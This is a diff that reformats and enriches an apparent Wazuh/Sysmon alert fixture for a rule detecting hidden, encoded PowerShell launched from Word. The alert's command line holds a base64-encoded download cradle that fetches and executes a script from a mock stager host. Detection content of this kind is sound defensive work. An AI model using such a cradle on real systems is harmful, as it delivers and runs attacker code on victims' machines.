@@ -5,24 +5,89 @@
     "id": "100300",
     "level": 12,
     "description": "PowerShell executed hidden with an encoded command (download cradle)",
-    "groups": ["windows", "sysmon", "powershell", "vigix_custom"],
+    "groups": [
+      "windows",
+      "sysmon",
+      "powershell",
+      "vigix_custom"
+    ],
     "firedtimes": 1,
-    "mitre": { "id": ["T1059.001"], "tactic": ["Execution"], "technique": ["PowerShell"] }
+    "mitre": {
+      "id": [
+        "T1059.001"
+      ],
+      "tactic": [
+        "Execution"
+      ],
+      "technique": [
+        "PowerShell"
+      ]
+    },
+    "mail": true
   },
-  "agent": { "id": "019", "name": "WKS-HR-03", "ip": "10.0.5.19" },
-  "manager": { "name": "wazuh-manager" },
-  "decoder": { "name": "windows_eventchannel" },
+  "agent": {
+    "id": "019",
+    "name": "WKS-HR-03",
+    "ip": "10.0.5.19"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
   "location": "EventChannel",
   "data": {
     "url": "http://vigix-mock-stager.net/a.ps1",
-    "dns": { "question": { "name": "vigix-mock-stager.net" } },
+    "dns": {
+      "question": {
+        "name": "vigix-mock-stager.net"
+      }
+    },
     "win": {
-      "system": { "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational" },
+      "system": {
+        "eventID": "1",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "version": "5",
+        "level": "4",
+        "opcode": "0",
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "task": "1",
+        "keywords": "0x8000000000000000",
+        "eventRecordID": "9283411",
+        "processID": "3320",
+        "threadID": "4160",
+        "computer": "WKS-HR-03.corp.local",
+        "severityValue": "INFORMATION",
+        "message": "\"Process Create:\\r\\nRuleName: -\\r\\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+        "systemTime": "2026-09-30T05:36:00.1120000Z"
+      },
       "eventdata": {
         "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "commandLine": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAHMAdABhAGcAZQByAC4AbgBlAHQALwBhAC4AcABzADEAJwApAA==",
         "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-        "user": "CORP\\hr.clerk"
+        "user": "CORP\\hr.clerk",
+        "ruleName": "-",
+        "utcTime": "2026-09-30 05:36:00.112",
+        "processGuid": "{3f1c8a2e-5e60-66fa-9d03-000000001a00}",
+        "processId": "7864",
+        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+        "description": "Windows PowerShell",
+        "product": "Microsoft® Windows® Operating System",
+        "company": "Microsoft Corporation",
+        "originalFileName": "PowerShell.EXE",
+        "currentDirectory": "C:\\Users\\hr.clerk\\Documents\\",
+        "logonGuid": "{3f1c8a2e-5d1b-66fa-4a3f-210000000000}",
+        "logonId": "0x213f4a",
+        "terminalSessionId": "1",
+        "integrityLevel": "Medium",
+        "parentProcessGuid": "{3f1c8a2e-5e5c-66fa-9c03-000000001a00}",
+        "parentProcessId": "6120",
+        "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n"
       }
     }
   },
